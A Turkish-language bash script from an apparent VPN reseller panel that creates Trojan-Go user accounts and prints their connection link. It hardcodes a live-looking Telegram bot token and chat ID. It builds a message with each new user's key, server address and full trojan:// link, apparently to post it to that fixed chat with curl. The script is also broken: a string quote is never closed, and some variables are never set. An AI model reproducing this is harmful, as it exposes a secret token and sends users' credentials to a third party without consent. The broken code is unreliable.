#!/bin/bash
# My Telegram : https://t.me/onvaovpn
# ==========================================
# Renk
RED='\033[0;31m'
NC='\033[0m'
GREEN='\033[0;32m'
ORANGE='\033[0;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
LIGHT='\033[0;37m'
# ==========================================
# Alınıyor
export CHATID="989061293"
export KEY="7721006940:AAHD_7QqIdBOGyOB2JVBS0bEsAOTmoYiqLs"
export TIME="10"
export URL="https://api.telegram.org/bot$KEY/sendMessage"
clear
MYIP=$(wget -qO- icanhazip.com);

echo "VPS Erişim Haklarını Kontrol ediliyor..."
if [ $MYIP = $IZIN ]; then
echo -e "${NC}${GREEN}İzin Kabul Edildi...${NC}"
else
echo -e "${NC}${RED}İzin Reddedildi!${NC}";
echo -e "${NC}${LIGHT}Lütfen Yönetici ile İletişime Geçin!!${NC}"
echo -e "${NC}${LIGHT}Telegram	: https://t.me/onvaovpn"
exit 0
fi
clear
echo "VPS Kontrol Ediliyor"
clear
uuid=$(cat /etc/trojan-go/uuid.txt)
source /var/lib/bztunnelling/ipvps.conf
if [[ "$IP" = "" ]]; then
domain=$(cat /etc/xray/domain)
else
domain=$IP
fi
trgo="$(cat ~/log-install.txt | grep -w "Tr Go" | cut -d: -f2|sed 's/ //g')"
until [[ $user =~ ^[a-zA-Z0-9_]+$ && ${user_EXISTS} == '0' ]]; do
		read -rp "Şifre : " -e user
		user_EXISTS=$(grep -w $user /etc/trojan-go/akun.conf | wc -l)

		if [[ ${user_EXISTS} == '1' ]]; then
			echo ""
			echo -e "Kullanıcı Adı ${RED}${user}${NC} Zaten VPS'de Mevcut, Lütfen Başka Bir Tane Seçin"
			exit 1
		fi
	done
read -p "Süre (Gün) : " masaaktif
sed -i '/"'""$uuid""'"$/a\,"'""$user""'"' /etc/trojan-go/config.json
exp=`date -d "$masaaktif days" +"%Y-%m-%d"`
hariini=`date -d "0 days" +"%Y-%m-%d"`
echo -e "### $user $exp" >> /etc/trojan-go/akun.conf
systemctl restart trojan-go.service
link="trojan://${user}@${domain}:${trgo}/?sni=${domain}&type=ws&host=${domain}&path=/trojango&encryption=none#$user"
clear
c=$(echo "${Quota}" | sed 's/[^0-9]*//g')
d=$((${c} * 1024 * 1024 * 1024))

if [[ ${c} != "0" ]]; then
  echo "${d}" >/etc/trojan-go/${user}
fi
DATADB=$(cat /etc/trojan-go/.trojan-go.db | grep "^###" | grep -w "${user}" | awk '{print $2}')
if [[ "${DATADB}" != '' ]]; then
  sed -i "/\b${user}\b/d" /etc/trojan-go/.trojan-go.db
fi
echo "### ${user} ${exp} ${uuid}" >>/etc/trojan-go/.trojan-go.db
CHATID="$CHATID"
KEY="$KEY"
TIME="$TIME"
URL="$URL"
TEXT="<code>====================</code>
<code>		TROGO</code>
<code>====================</code>
<code>Not	: ${user}
Adres    : ${domain}
Port     : ${trgo}
Anahtar  : ${user}
alterId  : 0
Güvenlik : auto
Ağ       : ws
Yol      : /trojango
İsim     : TROJAN-GO</code>
<code>====================</code>
<code> TROJAN-GO</code>
<code>====================</code>
<code>${link}</code>
<code>====================</code>
Oluşturulma Tarihi    : $hariini
Bitiş Tarihi  : $exp
whatsapp	: wa.me/6287728411949
Telegram	: t.me/anuybazoelk
<code>====================</code>

curl -s --max-time $TIME -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
echo ""
clear
echo -e "=======-TROJAN-GO-======="
echo -e "Not	: ${user} "
echo -e "Adres	: ${domain} "
echo -e "Port	: ${trgo} "
echo -e "Anahtar	: ${user} "
echo -e "Şifreleme	: none "
echo -e "Yol	: /trojango "
echo -e "Oluşturulma	: $hariini "
echo -e "Bitiş	: $exp "
echo -e "========================="
echo -e "TrGo Bağlantısı	: ${link} "
echo -e "========================="
echo -e "whatsapp	: wa.me/6287728411949 "
echo -e "Telegram	: t.me/anuybazoelk "
echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m${NC}"
echo -e ""
echo -e "Hepsibiraradavpn by Onvoa.net"
